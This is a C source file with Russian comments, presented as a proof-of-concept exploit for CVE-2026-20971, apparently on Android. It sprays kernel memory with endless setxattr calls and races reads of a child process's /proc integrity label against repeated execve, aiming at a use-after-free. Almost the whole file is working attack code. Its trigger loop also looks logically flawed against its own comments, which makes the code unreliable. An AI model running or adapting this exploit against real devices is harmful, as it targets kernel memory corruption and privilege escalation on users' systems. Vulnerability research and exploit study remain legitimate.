#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <stdbool.h>
#include <sys/wait.h>

// Поток для спрея памяти
void* spray_thread(void* arg) {
    char value[56]; 
    memset(value, 0xFF, sizeof(value)); // Длина 0xFFFF при чтении
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);
    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        setxattr(path, name, value, sizeof(value), 0);
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 PoC v24 (Self-Execve Trigger)\n");

    // Создаем дочерний процесс, который будет вызывать execve
    pid_t child_pid = fork();
    
    if (child_pid == 0) {
        // --- ДОЧЕРНИЙ ПРОЦЕСС (Триггер) ---
        char *argv[] = {"/system/bin/true", NULL};
        char *envp[] = {NULL};
        
        // Бесконечно заменяем свой образ
        while (1) {
            execve("/system/bin/true", argv, envp);
            // Если execve не удался, выходим
            _exit(1); 
        }
    } 
    else if (child_pid > 0) {
        // --- РОДИТЕЛЬСКИЙ ПРОЦЕСС (Атакующий) ---
        printf("[+] Spawned trigger child with PID: %d\n", child_pid);
        
        // Привязываемся к CPU 0
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(0, &set);
        sched_setaffinity(0, sizeof(set), &set);

        // Запускаем 4 потока спрея
        for (int i=0; i<4; i++) {
            pthread_t tid;
            pthread_create(&tid, NULL, spray_thread, NULL);
            pthread_detach(tid);
        }

        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/integrity/label", child_pid);
        
        char buf[256];
        long iter = 0;

        // Читаем метку дочернего процесса, пока он бесконечно делает execve
        while (1) {
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                // В этот момент дочерний процесс освобождает label
                read(fd, buf, sizeof(buf)); 
                close(fd);
            } else {
                // Если процесс умер (хотя не должен), ждем
                usleep(1000); 
            }
            
            iter++;
            if (iter % 10000 == 0) {
                printf("[*] Iterations: %ld\n", iter);
            }
        }
    }
    return 0;
}